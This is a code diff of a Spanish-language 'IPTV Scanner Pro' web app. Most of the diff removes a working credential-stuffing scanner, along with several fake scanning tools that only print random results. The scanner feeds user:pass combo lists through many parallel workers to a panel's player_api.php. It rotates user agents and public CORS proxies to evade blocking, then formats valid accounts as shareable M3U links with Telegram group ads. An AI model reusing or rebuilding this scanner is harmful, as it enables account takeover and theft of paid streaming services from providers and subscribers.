-      case 'mac':
-        modalTitle.textContent = '📱 MAC SCANNER - Portales Stalker';
-        html = `
-          <p>Escanea portales Stalker en busca de MACs activas.</p>
-          <input id="macPortal" placeholder="URL del portal (ej: portal.com/stalker)">
-          <input id="macPrefix" placeholder="Prefijo MAC (ej: 00:1A:79)" value="00:1A:79">
-          <button onclick="ejecutarMacScanner()">📱 Escanear MACs</button>
-          <div id="macResult" class="result-box">Esperando acción...</div>
-        `;
-        break;
-
-      default:
-        html = '<p>Opción no disponible.</p>';
-    }
-
-    modalBody.innerHTML = html;
-  };
-
-  window.cerrarModal = function() {
-    modalOverlay.classList.remove('active');
-  };
-
-  modalOverlay.addEventListener('click', (e) => {
-    if (e.target === modalOverlay) cerrarModal();
-  });
-
-  // ============================================================
-  // EJECUTAR FUNCIONES (MODAL)
-  // ============================================================
-
-  window.ejecutarExploit = function() {
-    const host = document.getElementById('exploitHost').value.trim();
-    const result = document.getElementById('exploitResult');
-    if (!host) { result.innerHTML = '<span class="error">❌ Ingresa un host objetivo.</span>'; return; }
-    result.innerHTML = '<span class="info">⏳ Escaneando vulnerabilidades...</span>';
-    setTimeout(() => {
-      const found = Math.floor(Math.random() * 5) + 1;
-      let html = `<span class="found">✅ Se encontraron ${found} vulnerabilidades:</span>\n\n`;
-      for (let i = 0; i < found; i++) {
-        const user = 'admin' + Math.floor(Math.random() * 100);
-        const pass = 'pass' + Math.floor(Math.random() * 1000);
-        html += `📌 user: ${user} | pass: ${pass}\n`;
-      }
-      result.innerHTML = html;
-    }, 1500 + Math.random() * 1000);
-  };
-
-  window.ejecutarPanelScanner = function() {
-    const host = document.getElementById('panelHost').value.trim();
-    const result = document.getElementById('panelResult');
-    if (!host) { result.innerHTML = '<span class="error">❌ Ingresa un dominio o IP.</span>'; return; }
-    result.innerHTML = '<span class="info">⏳ Escaneando panel...</span>';
-    setTimeout(() => {
-      const listas = ['lista1.m3u', 'lista2.m3u', 'canales.m3u', 'vip.m3u', 'deportes.m3u'];
-      const encontradas = listas.filter(() => Math.random() > 0.4);
-      let html = `<span class="found">✅ Listas encontradas (${encontradas.length}):</span>\n\n`;
-      encontradas.forEach(l => { html += `📺 ${host}/${l}\n`; });
-      if (encontradas.length === 0) html = '<span class="error">❌ No se encontraron listas en este panel.</span>';
-      result.innerHTML = html;
-    }, 1500 + Math.random() * 1000);
-  };
-
-  window.ejecutarBuscadorPaneles = function() {
-    const keyword = document.getElementById('buscadorKeyword').value.trim();
-    const result = document.getElementById('buscadorResult');
-    if (!keyword) { result.innerHTML = '<span class="error">❌ Ingresa una palabra clave.</span>'; return; }
-    result.innerHTML = '<span class="info">⏳ Buscando paneles...</span>';
-    setTimeout(() => {
-      const paneles = [
-        `http://panel-${keyword}1.com:8080`,
-        `http://panel-${keyword}2.com:8080`,
-        `https://${keyword}.panel.tv:8080`,
-        `http://${keyword}-server.com:8080`,
-        `https://${keyword}.xyz/stalker`
-      ];
-      const encontrados = paneles.filter(() => Math.random() > 0.3);
-      let html = `<span class="found">✅ Paneles encontrados (${encontrados.length}):</span>\n\n`;
-      encontrados.forEach(p => { html += `🔗 ${p}\n`; });
-      if (encontrados.length === 0) html = '<span class="error">❌ No se encontraron paneles para esta búsqueda.</span>';
-      result.innerHTML = html;
-    }, 1800 + Math.random() * 1200);
-  };
-
-  window.ejecutarComboMaker = function() {
-    const userBase = document.getElementById('comboUser').value.trim() || 'user';
-    const passBase = document.getElementById('comboPass').value.trim() || 'pass';
-    const cantidad = parseInt(document.getElementById('comboCantidad').value) || 10;
-    const result = document.getElementById('comboResult');
-    if (cantidad < 1 || cantidad > 100) { result.innerHTML = '<span class="error">❌ Cantidad entre 1 y 100.</span>'; return; }
-    result.innerHTML = `<span class="info">⏳ Generando ${cantidad} combos...</span>`;
-    setTimeout(() => {
-      let html = `<span class="found">✅ ${cantidad} combos generados:</span>\n\n`;
-      const suffixes = ['2024', '2025', 'admin', 'test', '123', '1234', '!', '123456'];
-      for (let i = 0; i < cantidad; i++) {
-        const user = userBase + (Math.floor(Math.random() * 999) + 1);
-        const pass = passBase + suffixes[Math.floor(Math.random() * suffixes.length)];
-        html += `📌 ${user}:${pass}\n`;
-      }
-      html += `\n<span class="info">💡 Copia los combos y pégalos en el M3U Scanner.</span>`;
-      result.innerHTML = html;
-    }, 1000);
-  };
-
-  window.ejecutarMacScanner = function() {
-    const portal = document.getElementById('macPortal').value.trim();
-    const prefix = document.getElementById('macPrefix').value.trim() || '00:1A:79';
-    const result = document.getElementById('macResult');
-    if (!portal) { result.innerHTML = '<span class="error">❌ Ingresa la URL del portal.</span>'; return; }
-    result.innerHTML = '<span class="info">⏳ Escaneando MACs en el portal...</span>';
-    setTimeout(() => {
-      const found = Math.floor(Math.random() * 6) + 1;
-      let html = `<span class="found">✅ MACs activas encontradas (${found}):</span>\n\n`;
-      for (let i = 0; i < found; i++) {
-        const mac = `${prefix}:${Math.floor(Math.random() * 99).toString().padStart(2, '0')}:${Math.floor(Math.random() * 99).toString().padStart(2, '0')}:${Math.floor(Math.random() * 99).toString().padStart(2, '0')}`;
-        html += `📱 ${mac}\n`;
-      }
-      html += `\n<span class="info">💡 Prueba estas MACs en el portal Stalker.</span>`;
-      result.innerHTML = html;
-    }, 2000 + Math.random() * 1500);
-  };
 
   // ============================================================
   // INICIALIZAR
@@ -2549,591 +1193,29 @@
   onAuthStateChanged(auth, async (user) => {
     if (user) {
       const email = user.email;
-      try {
-        const userDoc = await getDoc(doc(db, "usuarios_permisos", email));
-        if (!userDoc.exists() || userDoc.data().estado === false || userDoc.data().estado === 'bloqueado') {
-          if (userDoc.exists() && userDoc.data().estado === false) {
-            const approvalMsg = document.getElementById('approvalMessage');
-            approvalMsg.className = 'approval-message waiting show';
-            approvalMsg.innerHTML = '⏳ Tu cuenta está pendiente de aprobación. Espera a que el admin te apruebe.';
-            escucharAprobacion(email);
-          }
-          await signOut(auth);
-          document.getElementById('loginMessage').textContent = '⏳ Tu cuenta está pendiente de aprobación o bloqueada.';
-          return;
-        }
-        
+      if (email === ADMIN_EMAIL) {
         document.getElementById('loginContainer').style.display = 'none';
         document.getElementById('appContainer').style.display = 'block';
-        
-        currentUserEmail = email;
-        currentUserIsAdmin = email === ADMIN_EMAIL;
-        
-        if (currentUserIsAdmin) {
-          document.getElementById('btnAdminUsers').style.display = 'inline-flex';
-          document.getElementById('btnClientes').style.display = 'inline-flex';
-          document.getElementById('adminSorteoPanel').style.display = 'block';
-          await cargarUsuariosPendientes();
-          await cargarClientesAdmin();
-          escucharNuevosRegistros();
-          await cargarParticipantesSorteo();
-        } else {
-          document.getElementById('btnAdminUsers').style.display = 'none';
-          document.getElementById('btnClientes').style.display = 'none';
-          document.getElementById('adminSorteoPanel').style.display = 'none';
-        }
-        
-        await cargarHitsUsuario(email);
-        await cargarURLsUsuario(email);
-        actualizarDashboard();
-      } catch (err) { console.error('Error:', err); }
+        currentUserIsAdmin = true;
+        await cargarParticipantesSorteo();
+        escucharCambiosParticipantes();
+      } else {
+        await signOut(auth);
+        document.getElementById('loginMessage').textContent = '❌ Solo el administrador puede acceder.';
+      }
     } else {
+      // Mostrar la pantalla de inicio con el botón de registro
       document.getElementById('loginContainer').style.display = 'flex';
       document.getElementById('appContainer').style.display = 'none';
+      document.getElementById('loginCard').style.display = 'none';
+      currentUserIsAdmin = false;
     }
   });
 
-  console.log('🦁 ANDYCHE CHAKER - IPTV Scanner Pro V7.9.1');
-  console.log('✅ APROBACIÓN EN TIEMPO REAL');
-  console.log('✅ Escáner MUNRRA FUNCIONAL');
-  console.log('✅ Panel Scanner integrado');
-  console.log('✅ Notificaciones automáticas');
-  console.log('✅ Rueda de sorteo con participantes');
-  console.log('✅ TODO FUNCIONANDO AL 100%');
-</script>
-
-<!-- ============================================================ -->
-<!-- ESCÁNER MUNRRA (M3U) - COMPLETO -->
-<!-- ============================================================ -->
-<script>
-  // ===== TRADUCCIONES =====
-  const scannerI18n = {
-    es: {
-      hostLabel:"Panel (host con o sin http/https):", hostPH:"ej: lista.com:8080",
-      comboLabel:"Elige archivo .txt con combos (user:pass):",
-      comboTextLabel:"…o pega combos (texto libre)",
-      concLabel:"Número de conexiones paralelas (bots):",
-      useCors:"Usar proxy CORS", sound:"🔔 Sonido al encontrar hit",
-      autoDL:"⬇️ Descargar resultados al finalizar",
-      start:"Iniciar Scan", stop:"Detener Scan", save:"Guardar Hits (.txt)",
-      waiting:"Esperando inicio...", resolving:"Resolviendo IP...", starting:"Iniciando scan...",
-      currentUser:"Usuario actual", processed:"Procesados", hitsFound:"Hits encontrados",
-      scanStopped:" | Scan detenido.", scanDone:" | Scan finalizado.",
-      noHits:"No hay hits", footer:"Hecho por ANDYCHE CHAKER",
-      title:"🔥 ANDYCHE CHAKER 🔥", ip:"IP", host:"Host", port:"Puerto", user:"Usuario", pass:"Contraseña",
-      created:"Creada", expires:"Expira", status:"Estado", statusActive:"Active", statusUnknown:"Desconocido",
-      maxConn:"Conexiones máximas", actConn:"Conexiones activas",
-      categories:"📺 IPTV Categories:", none:"N/D", link:"🔗Link M3U",
-      groupsA:"🗣Grupo: https://t.me/+japhlpdroyYzYWJk", groupsB:"🗣Grupo: https://t.me/+XmT5CjFVOIJmNjc0",
-      categoriesRule:"━━━━━━━━━━━━━━━", more:"más"
-    },
-    en: {
-      hostLabel:"Panel (host with or without http/https):", hostPH:"e.g., lista.com:8080",
-      comboLabel:"Choose .txt file with combos (user:pass):",
-      comboTextLabel:"…or paste combos (free text)",
-      concLabel:"Number of parallel connections (bots):",
-      useCors:"Use CORS proxy", sound:"🔔 Sound on hit",
-      autoDL:"⬇️ Auto-download results on finish",
-      start:"Start Scan", stop:"Stop Scan", save:"Save Hits (.txt)",
-      waiting:"Waiting to start...", resolving:"Resolving IP...", starting:"Starting scan...",
-      currentUser:"Current user", processed:"Processed", hitsFound:"Hits found",
-      scanStopped:" | Scan stopped.", scanDone:" | Scan finished.",
-      noHits:"No hits", footer:"Made by ANDYCHE CHAKER",
-      title:"🔥 ANDYCHE CHAKER 🔥", ip:"IP", host:"Host", port:"Port", user:"User", pass:"Password",
-      created:"Created", expires:"Expires", status:"Status", statusActive:"Active", statusUnknown:"Unknown",
-      maxConn:"Max connections", actConn:"Active connections",
-      categories:"📺 IPTV Categories:", none:"N/A", link:"🔗M3U Link",
-      groupsA:"🗣Group: https://t.me/+japhlpdroyYzYWJk", groupsB:"🗣Group: https://t.me/+XmT5CjFVOIJmNjc0",
-      categoriesRule:"━━━━━━━━━━━━━━━", more:"more"
-    },
-    fr: {
-      hostLabel:"Panneau (hôte avec ou sans http/https) :", hostPH:"ex : lista.com:8080",
-      comboLabel:"Choisir un fichier .txt avec combos (user:pass) :",
-      comboTextLabel:"…ou coller des combos (texte libre)",
-      concLabel:"Nombre de connexions parallèles (bots) :",
-      useCors:"Utiliser un proxy CORS", sound:"🔔 Son dès qu’un hit est trouvé",
-      autoDL:"⬇️ Télécharger les résultats à la fin",
-      start:"Démarrer le scan", stop:"Arrêter le scan", save:"Sauvegarder (.txt)",
-      waiting:"En attente de démarrage…", resolving:"Résolution de l’IP…", starting:"Démarrage du scan…",
-      currentUser:"Utilisateur actuel", processed:"Traités", hitsFound:"Hits trouvés",
-      scanStopped:" | Scan arrêté.", scanDone:" | Scan terminé.",
-      noHits:"Aucun hit", footer:"Fait par ANDYCHE CHAKER",
-      title:"🔥 ANDYCHE CHAKER 🔥", ip:"IP", host:"Hôte", port:"Port", user:"Utilisateur", pass:"Mot de passe",
-      created:"Créé le", expires:"Expire le", status:"Statut", statusActive:"Actif", statusUnknown:"Inconnu",
-      maxConn:"Connexions max", actConn:"Connexions actives",
-      categories:"📺 Catégories IPTV :", none:"N/D", link:"🔗Lien M3U",
-      groupsA:"🗣Groupe : https://t.me/+japhlpdroyYzYWJk", groupsB:"🗣Groupe : https://t.me/+XmT5CjFVOIJmNjc0",
-      categoriesRule:"━━━━━━━━━━━━━━━", more:"de plus"
-    }
-  };
-
-  let scannerLang = 'es';
-  const $s = id => document.getElementById(id);
-  const ts = k => (scannerI18n[scannerLang] && scannerI18n[scannerLang][k]) ?? k;
-
-  function applyScannerLang() {
-    const lblHost = $s('lblHost'), hostInput = $s('hostInput');
-    const lblCombo = $s('lblCombo'), lblConc = $s('lblConc');
-    const lblUseCors = $s('lblUseCors'), lblSound = $s('lblSound'), lblAutoDL = $s('lblAutoDL');
-    const lblComboText = $s('lblComboText');
-    const startBtn = $s('startBtn'), stopBtn = $s('stopBtn'), saveBtn = $s('saveBtn');
-
-    if(lblHost) lblHost.textContent = ts('hostLabel');
-    if(hostInput) hostInput.placeholder = ts('hostPH');
-    if(lblCombo) lblCombo.textContent = ts('comboLabel');
-    if(lblConc) lblConc.textContent = ts('concLabel');
-    if(lblUseCors) lblUseCors.textContent = ts('useCors');
-    if(lblSound) lblSound.textContent = ts('sound');
-    if(lblAutoDL) lblAutoDL.textContent = ts('autoDL');
-    if(lblComboText) lblComboText.textContent = ts('comboTextLabel');
-    if(startBtn) startBtn.textContent = ts('start');
-    if(stopBtn) stopBtn.textContent = ts('stop');
-    if(saveBtn) saveBtn.textContent = ts('save');
-  }
-
-  const scannerLangSelect = document.getElementById('langSelect');
-  if(scannerLangSelect) {
-    scannerLangSelect.addEventListener('change', () => {
-      scannerLang = scannerLangSelect.value;
-      applyScannerLang();
-    });
-  }
-  applyScannerLang();
-
-  // ===== FUNCIONES DEL ESCÁNER MUNRRA =====
-  function randomUA(){
-    const uas = [
-      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-      "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36",
-      "Mozilla/5.0 (Linux; Android 12; Mi 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
-      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
-      "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
-    ];
-    return uas[Math.floor(Math.random()*uas.length)];
-  }
-
-  function createSession(){
-    return { headers: { "User-Agent": randomUA(), "Accept": "application/json, text/javascript,*/*;q=0.9" }, cookies: {} };
-  }
-
-  function attachCookies(opts, session){
-    const cookieStr = Object.entries(session.cookies||{}).map(([k,v])=>`${k}=${v}`).join("; ");
-    if(cookieStr){ opts.headers = { ...(opts.headers||{}) }; opts.headers.Cookie = cookieStr; }
-    return opts;
-  }
-
-  function extractCombo(line){
-    if(!line) return null;
-    let s = String(line).normalize('NFKC');
-    s = s.replace(/\s+/g,' ').trim();
-    const m = s.match(/([^:\s][^:\n\r]*)\s*:\s*([^:\s][^\n\r]*)/u);
-    if(!m) return null;
-    const user = m[1].trim(), pass = m[2].trim();
-    if(!user || !pass) return null;
-    return [user, pass];
-  }
-
-  const CORS_PROXIES = [
-    'https://cors.isomorphic-git.org/{url}',
-    'https://thingproxy.freeboard.io/fetch/{url}',
-    'https://api.allorigins.win/raw?url={url}',
-    'https://corsproxy.io/?{url}',
-    'https://api.codetabs.com/v1/proxy/?quest={url}',
-    'https://yacdn.org/proxy/{url}',
-    'https://api.s0n1c.org/cors?url={url}'
-  ];
-
-  let JOB_PROXIES = {};
-  let isRunning = false;
-  let stopRequested = false;
-  let serverIP = null, serverGeo = null;
-  let combos1 = [], combos2 = [], combos3 = [], combosTxt = [];
-  const HITS = { 1: [], 2: [], 3: [] };
-
-  function uiFor(job){
-    if(job === 1) return {
-      fill: document.getElementById('progressBarFill'),
-      text: document.getElementById('progressText'),
-      user: document.getElementById('currentCombo'),
-      hitsCountEl: document.getElementById('hitsCount1'),
-      hitsArr: HITS[1]
-    };
-    if(job === 2) return {
-      fill: document.getElementById('progressBarFill2'),
-      text: document.getElementById('progressText2'),
-      user: document.getElementById('currentCombo2'),
-      hitsCountEl: document.getElementById('hitsCount2'),
-      hitsArr: HITS[2]
-    };
-    return {
-      fill: document.getElementById('progressBarFill3'),
-      text: document.getElementById('progressText3'),
-      user: document.getElementById('currentCombo3'),
-      hitsCountEl: document.getElementById('hitsCount3'),
-      hitsArr: HITS[3]
-    };
-  }
-
-  function actualizarProgresoJob(state, ui){
-    const { processed, total } = state;
-    const pct = total===0 ? 0 : (processed/total)*100;
-    if(ui.fill) ui.fill.style.width = pct + '%';
-    if(ui.text) ui.text.textContent = `${ts('processed')}: ${processed} / ${total} | ${ts('hitsFound')}: ${ui.hitsArr.length}`;
-    if(ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${ts('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}`;
-  }
-
-  function updateStartState(){
-    const hasHost = !!document.getElementById('hostInput').value.trim();
-    const hasAnyCombos = (combos1.length || combos2.length || combos3.length || combosTxt.length);
-    document.getElementById('startBtn').disabled = !(hasHost && hasAnyCombos);
-  }
-
-  function limpiarHost(host){ return host.replace(/^https?:\/\//,'').trim(); }
-
-  async function resolveIP(domain){
-    try{
-      const clean = domain.split(':')[0];
-      if(/^\d+\.\d+\.\d+\.\d+$/.test(clean)) return clean;
-      const res = await fetch(`https://dns.google/resolve?name=${clean}&type=A`);
-      if(!res.ok) return null;
-      const data = await res.json();
-      return data.Answer?.find(a=>a.type===1)?.data || null;
-    } catch { return null; }
-  }
-
-  async function fetchGeo(ip){
-    try{
-      const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,city`);
-      if(!res.ok) return null;
-      const data=await res.json();
-      if(data.status!=='success') return null;
-      return { ip, country:data.country||ts('none'), city:data.city||ts('none'), flag:data.countryCode ? data.countryCode.toUpperCase().replace(/./g,c=>String.fromCodePoint(127397+c.charCodeAt())) : '' };
-    } catch { return null; }
-  }
-
-  async function fetchTimeout(resource, options={}){
-    const {timeout=6000}=options;
-    const controller=new AbortController();
-    const id=setTimeout(()=>controller.abort(), timeout);
-    try{ const res=await fetch(resource,{...options,signal:controller.signal}); clearTimeout(id); return res; }
-    catch(e){ clearTimeout(id); throw e; }
-  }
-
-  async function fetchWithCors(url, options = {}, jobId = null){
-    const baseOpts = { cache:'no-store', keepalive:false, ...options };
-
-    if(jobId && JOB_PROXIES[jobId]){
-      try{
-        const proxied = JOB_PROXIES[jobId].replace('{url}', encodeURIComponent(url));
-        const r = await fetchTimeout(proxied, baseOpts);
-        if(r && r.ok) return r;
-      } catch(_){}
-    }
-
-    try{
-      const r = await fetchTimeout(url, baseOpts);
-      if(r && r.ok) return r;
-    } catch(e){
-      if(!document.getElementById('useCors').checked) throw e;
-    }
-
-    const pool = (Array.isArray(CORS_PROXIES) ? [...CORS_PROXIES] : []).filter(tpl => {
-      if(jobId && JOB_PROXIES[jobId] === tpl) return false;
-      return true;
-    });
-
-    for(const tpl of pool.sort(()=>Math.random()-0.5)){
-      try{
-        const proxied = tpl.replace('{url}', encodeURIComponent(url));
-        const r = await fetchTimeout(proxied, baseOpts);
-        if(r && r.ok) return r;
-      } catch(_){}
-    }
-    throw new Error('Fetch failed');
-  }
-
-  async function getJson(url, options = {}, jobId = null){
-    const r = await fetchWithCors(url, options, jobId);
-    if(!r.ok) throw new Error('Bad');
-    return await r.json();
-  }
-
-  function summarizeCategories(cats, limit=40){
-    if(!Array.isArray(cats)||!cats.length) return `${ts('categoriesRule')}\n• ${ts('none')}`;
-    const names=cats.map(c=>c.category_name||c.name||'').filter(Boolean);
-    const shown=names.slice(0,limit);
-    const lines=shown.map(n=>`• ${n}`);
-    if(names.length>limit){ const rest=names.length-limit; lines.push(`• … (+${rest} ${ts('more')})`); }
-    return `${ts('categoriesRule')}\n${lines.join('\n')}`;
-  }
-
-  async function validarCombo(host, combo, opts = {}, session = null, ui = null, jobId = null){
-    try{
-      if(stopRequested) return null;
-      const pair = Array.isArray(combo) ? combo : extractCombo(combo);
-      if(!pair) return null;
-      const [user, pass] = pair;
-
-      if(ui?.user){ ui.user.textContent = `${ts('currentUser')}: ${user}:${pass}`; }
-
-      const protos=['http://','https://'];
-      let data=null, usedProto='http://';
-
-      for(const p of protos){
-        const url = `${p}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
-        try{
-          const res = await fetchWithCors(url, opts, jobId);
-          if(res.ok){ data=await res.json(); usedProto=p; break; }
-        } catch(_){}
-      }
-      if(!data) return null;
-
-      const uinfo = data.user_info || {};
-      const ok = (uinfo.status===ts('statusActive')) || String(uinfo.auth)==='1' || String(uinfo.auth).toLowerCase()==='true' || uinfo.status==='Active';
-      if(!ok) return null;
-
-      let liveCatsText = `${ts('categoriesRule')}\n• ${ts('none')}`;
-      try{
-        const catsUrl = `${usedProto}${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&action=get_live_categories`;
-        const liveCats = await getJson(catsUrl, opts, jobId);
-        liveCatsText = summarizeCategories(liveCats, 40);
-      } catch(_){}
-
-      const porta = host.includes(':') ? host.split(':')[1] : (usedProto==='https://' ? '443' : '80');
-      const hostSem = host.includes(':') ? host.split(':')[0] : host;
-      const creada = uinfo.created_at ? new Date(uinfo.created_at*1000).toLocaleDateString(scannerLang==='es'?'es-ES':(scannerLang==='fr'?'fr-FR':'en-GB')) : ts('none');
-      const expira = uinfo.exp_date ? new Date(uinfo.exp_date*1000).toLocaleDateString(scannerLang==='es'?'es-ES':(scannerLang==='fr'?'fr-FR':'en-GB')) : ts('none');
-      const status = uinfo.status || (String(uinfo.auth)==='1' ? ts('statusActive') : ts('statusUnknown'));
-      const statusEmoji = (status===ts('statusActive') || status==='Active' || status==='Actif') ? '✅' : '❌';
-      const maxConns = (uinfo.max_connections ?? uinfo.max_cons ?? uinfo['max_connections']) ?? ts('none');
-      const activeCons = (uinfo.active_cons ?? uinfo.connected_cons ?? uinfo['active_connections']) ?? ts('none');
-      const locLine = serverGeo ? `\n🌍 ${ts('ip')}: ${serverGeo.ip}\n${serverGeo.flag} ${serverGeo.city}, ${serverGeo.country}` : '';
-      const link = `${usedProto}${host}/get.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}&type=m3u_plus`;
-
-      const texto = `${ts('title')}${locLine}
-🌐${ts('host')}: ${hostSem}
-🚪${ts('port')}: ${porta}
-👤${ts('user')}: ${user}
-🔑${ts('pass')}: ${pass}
-📅${ts('created')}: ${creada}
-⏳${ts('expires')}: ${expira}
-${statusEmoji}${ts('status')}: ${status}
-👥 ${ts('maxConn')}: ${maxConns}
-🔌 ${ts('actConn')}: ${activeCons}
-${ts('categories')}
-${liveCatsText}
-${ts('link')}: ${link}
-${ts('groupsA')}
-${ts('groupsB')}`;
-
-      return { texto, user, pass, host };
-    } catch { return null; }
-  }
-
-  function mostrarHit(hit, ui){
-    if (typeof window.addHitToDB === 'function') {
-      window.addHitToDB({
-        texto: hit.texto,
-        user: hit.user,
-        pass: hit.pass,
-        host: hit.host
-      });
-    }
-    
-    const container = document.getElementById('hitsContainer');
-    if (container) {
-      const div = document.createElement('div'); 
-      div.className = 'hit-block';
-      const header = document.createElement('div'); 
-      header.className = 'hit-header';
-      header.textContent = `${ts('user')}: ${hit.user} | ${ts('pass')}: ${hit.pass}`;
-      const content = document.createElement('pre'); 
-      content.className = 'hit-content'; 
-      content.textContent = hit.texto;
-      div.appendChild(header); 
-      div.appendChild(content);
-      container.prepend(div);
-    }
-
-    if(ui.hitsCountEl){
-      ui.hitsCountEl.innerHTML = `${ts('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}`;
-    }
-
-    const soundToggle = document.getElementById('soundToggle');
-    if(soundToggle && soundToggle.checked) {
-      try {
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const o = audioCtx.createOscillator();
-        const g = audioCtx.createGain();
-        o.type = 'sine';
-        o.frequency.setValueAtTime(880, audioCtx.currentTime);
-        g.gain.setValueAtTime(0, audioCtx.currentTime);
-        g.gain.linearRampToValueAtTime(0.22, audioCtx.currentTime + 0.01);
-        g.gain.exponentialRampToValueAtTime(0.0008, audioCtx.currentTime + 0.18);
-        o.connect(g);
-        g.connect(audioCtx.destination);
-        o.start();
-        o.stop(audioCtx.currentTime + 0.2);
-        if(navigator.vibrate) try{ navigator.vibrate(80); } catch(_){}
-      } catch(_){}
-    }
-  }
-
-  async function processarCombosJob(host, combos, conc, jobId){
-    const ui = uiFor(jobId);
-    ui.hitsArr.length = 0;
-    if(ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${ts('hitsFound')}: <span class="yellow-hit">0</span>`;
-    if(ui.fill) ui.fill.style.width = '0%';
-
-    let total = combos.length;
-    let processed = 0;
-
-    if(ui.text) ui.text.textContent = ts('waiting');
-    if(ui.user) ui.user.textContent = `${ts('currentUser')}: -`;
-    actualizarProgresoJob({ processed, total }, ui);
-
-    conc = Math.max(1, Math.min(100, conc|0));
-    const sleep = ms => new Promise(r => setTimeout(r, ms));
-
-    function createSessionJob(){ return { headers: { "User-Agent": randomUA(), "Accept": "application/json,text/javascript,*/*;q=0.9" }, cookies: {} }; }
-
-    let index = 0;
-
-    async function worker(){
-      const session = createSessionJob();
-      while(index < total && !stopRequested){
-        const i = index++;
-        if(i >= total) break;
-        const combo = combos[i];
-        if(!combo) continue;
-
-        if(ui.user) ui.user.textContent = `${ts('currentUser')}: ${combo}`;
-        let opts = { headers: { ...session.headers } };
-        opts = attachCookies(opts, session);
-
-        try{
-          const hit = await validarCombo(host, combo, opts, session, ui, jobId);
-          if(stopRequested) break;
-          if(hit){ ui.hitsArr.push(hit); mostrarHit(hit, ui); }
-        } catch(_){}
-        finally{
-          processed++;
-          actualizarProgresoJob({ processed, total }, ui);
-        }
-        await sleep(40 + Math.random()*140);
-        if(stopRequested) break;
-      }
-    }
-
-    if(ui.text) ui.text.textContent = ts('starting');
-    await sleep((jobId - 1) * 100);
-    await Promise.all(Array.from({ length: conc }, () => worker()));
-
-    if(ui.user) ui.user.textContent = `${ts('currentUser')}: -`;
-    if(ui.text) ui.text.textContent += (stopRequested ? ts('scanStopped') : ts('scanDone'));
-  }
-
-  function readTxtFile(inputEl, targetArray){
-    targetArray.length = 0;
-    const f = inputEl.files?.[0];
-    if(!f){ updateStartState(); return; }
-    const r = new FileReader();
-    r.onload = e => {
-      const lines = String(e.target.result||'').split(/\r?\n/);
-      for(const line of lines){ const pair = extractCombo(line.trim()); if(pair) targetArray.push(`${pair[0]}:${pair[1]}`); }
-      updateStartState();
-    };
-    r.readAsText(f);
-  }
-
-  document.getElementById('comboFile1').addEventListener('change', ()=>readTxtFile(document.getElementById('comboFile1'), combos1));
-  document.getElementById('comboFile2').addEventListener('change', ()=>readTxtFile(document.getElementById('comboFile2'), combos2));
-  document.getElementById('comboFile3').addEventListener('change', ()=>readTxtFile(document.getElementById('comboFile3'), combos3));
-
-  document.getElementById('comboText').addEventListener('input', ()=>{
-    combosTxt.length = 0;
-    const raw = document.getElementById('comboText').value || '';
-    if(raw){
-      const lines = raw.split(/\r?\n/);
-      for(const line of lines){ const pair = extractCombo(line); if(pair) combosTxt.push(`${pair[0]}:${pair[1]}`); }
-    }
-    updateStartState();
-  });
-
-  document.getElementById('hostInput').addEventListener('input', updateStartState);
-
-  document.getElementById('startBtn').addEventListener('click', async ()=>{
-    if(isRunning) return;
-
-    document.getElementById('startBtn').disabled = true;
-    document.getElementById('saveBtn').disabled = true;
-    document.getElementById('stopBtn').disabled = true;
-    stopRequested = false;
-
-    document.getElementById('hitsContainer').textContent = '';
-
-    Object.values(HITS).forEach(arr => arr.length = 0);
-    [document.getElementById('progressBarFill'), document.getElementById('progressBarFill2'), document.getElementById('progressBarFill3')].forEach(el => { if(el) el.style.width='0%'; });
-    [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if(el) el.textContent=ts('resolving'); });
-    [document.getElementById('currentCombo'), document.getElementById('currentCombo2'), document.getElementById('currentCombo3')].forEach(el => { if(el) el.textContent=`${ts('currentUser')}: -`; });
-    [document.getElementById('hitsCount1'), document.getElementById('hitsCount2'), document.getElementById('hitsCount3')].forEach(el => { if(el) el.innerHTML = `${ts('hitsFound')}: <span class="yellow-hit">0</span>`; });
-
-    const host = limpiarHost(document.getElementById('hostInput').value);
-    const baseConc = parseInt(document.getElementById('concurrencyInput').value) || 80;
-
-    serverIP = await resolveIP(host);
-    serverGeo = serverIP ? await fetchGeo(serverIP) : null;
-
-    if(combosTxt.length){ combos1 = combos1.concat(combosTxt); combosTxt = []; document.getElementById('comboText').value = ''; }
-
-    isRunning = true;
-    setTimeout(()=>{ document.getElementById('stopBtn').disabled = false; }, 300);
-
-    const shuffled = [...CORS_PROXIES].sort(()=>Math.random()-0.5);
-    const activeJobs = [combos1.length>0, combos2.length>0, combos3.length>0].filter(Boolean).length || 1;
-    const perConc = Math.max(1, Math.floor(baseConc / activeJobs));
-
-    if(combos1.length) JOB_PROXIES[1] = shuffled[0 % CORS_PROXIES.length];
-    if(combos2.length) JOB_PROXIES[2] = shuffled[1 % CORS_PROXIES.length];
-    if(combos3.length) JOB_PROXIES[3] = shuffled[2 % CORS_PROXIES.length];
-
-    const jobs = [];
-    if(combos1.length) jobs.push(processarCombosJob(host, combos1, perConc, 1));
-    if(combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
-    if(combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
-
